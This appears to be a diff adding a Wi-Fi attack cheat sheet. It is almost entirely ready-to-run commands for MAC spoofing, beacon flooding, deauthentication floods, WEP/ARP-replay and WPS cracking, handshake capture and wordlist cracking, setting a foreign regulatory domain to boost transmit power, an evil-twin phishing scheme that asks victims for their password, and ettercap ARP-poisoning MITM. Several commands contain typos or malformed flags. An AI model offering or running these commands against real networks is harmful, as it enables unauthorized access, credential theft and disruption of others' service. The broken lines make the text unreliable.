@@ -1,0 +1,131 @@
+Managed : Only receive packets that are send to your device
+Monitor : Receive all the packets in the air
+
+--Wifi Adapter:
+
+ifconfig
+iwconfig
+iwconfig wlan0
+
+--Enable Monitor Mode on Wireless Adapter:
+
+Method 01:
+airmon-ng start wlan0
+
+Method 02:
+ifconfig wlan0 down
+ifconfig wlan0 up
+airmon-ng check kill
+airmon-ng start wlan0
+
+Method 03:
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+
+--Change your Mac:
+
+ifconfig wlan0
+ifconfig wlan0 down
+macchanger –-help
+macchanger -–random wlan0
+
+--Beacon-Frames:
+
+ifconfig
+airmon-ng start wlan0
+ifconfig wlan0
+mdk3 --help
+mdk3 wlan0mon b –n FAKEAP
+mdk3 wlan0mon b –n TESTAP
+
+--Target Sniffing:
+airodump-ng wlan0
+airodump-ng -–channel 2 -–bssid 66:22:33:44:55:55 wlan0
+
+--packet Sniffing:
+iwconfig wlan0
+airodump-ng -–band a wlan0
+
+--Deauth Attack:
+aireplay-ng -–deauth 10000 –a {AP MAC address} wlan0
+aireplay-ng -–deauth 10000 –a {AP MAC address} –c {Client MAC address} wlan0
+
+--Transmit Power:
+iwconfig wlan0 txpower 30
+ifconfig wlan0 down
+iw reg set GY
+ifconfig wlan0 up
+
+--WEP Attack Basics:
+airodump wlan0
+airodump-ng -–channel {channel number} –-bssid {AP MAC} --write {file name.cap} wlan0
+aircrack-ng {file name.cap}
+
+--WEP Attack No Clients:
+airodump-ng wlan0
+airodump-ng -–channel 2 -–bssid 66:22:33:44:55:55 --write ArpAttack wlan0
+aireplay-ng -–fakeauth 1 –a {AP MAC} –h {MAC} wlan0
+aireplay-ng --arpreply -b {BSSID} -h {Station} wlan0
+
+--ARP Request-Replay Attack:
+aireplay-ng –-arpreplay –b {BSSID} –h {MAC} wlan0
+
+--WPS Attack:
+wash –i wlan0
+airodump-ng wlan0
+reaver –b {BSSID} –c {Channel} –i wlan0
+
+--Unlock WPS:
+wash -i wlan0 -c {Channel}
+mdk3 --help
+mdk3 wlan0 a -a {BSSID}
+reaver –b {BSSID} –c {Channel} –i wlan0
+mkd3 wlan0 x 0 -t {BSSID} -n HSB -s 1000
+
+--Capturing 4-Way Handshake:
+airodump-ng wlan0
+airodump-ng -–bssid {AP-MAC} -–channel {Channel Number} -–showack --write {filename} wlan0
+aireplay-ng -0 20 -a {AP-MAC} -c {Station} wlan0
+
+--Password Cracking:
+aircrack-ng -w pass.txt file.cap 
+john –-wordlist= {wordlist} –-stdout –-session= {session-name} | aircrack-ng –w - -b {bssid} {filename.cap}
+john –-wordlist=pass.txt –-stdout –-session=testnetworksession | aircrack-ng –w - -b {bssid} {filename.cap}
+
+--Restore Session:
+john restore={session-name} | aircrack-ng –w - -b {bssid} {filename.cap}
+john --restore=test-network-session | aircrack-ng –w - -b {bssid} {filename.cap}
+
+--Evil Rwin Attack:
+
+- Create Fake Access Point
+- Perform Deauth Attack on Legitimate access Point
+- Once user will connect to Fake AP we will ask them to enter the password to update Firmware
+
+Tools:
+Old & stable version : https://github.com/chetan31295/fluxion
+Latest Version : https://github.com/FluxionNetwork/fluxion
+
+--Captive Portal:
+▪ Usually Open Access Point
+▪ Login web page
+▪ Used in Hotels, Coffee shops, malls etc…
+
+--MITM:
+arp -a
+ettercap –Tq –M arp:remote –i wlan0 ///
+
+--Wifi Hacking:
+
+iwconfig
+ifconfig wlan0 down
+ifconfig wlan0 up
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng --bssid <MAC> --channel <CH> --write Filename wlan0
+aireplay-ng --deauth 0 -a <MAC> -c <Client_MAC> wlan0
+
+<Restart Your Vmware>
+aircrack-ng "cap file path" -w "pass file" wlan0
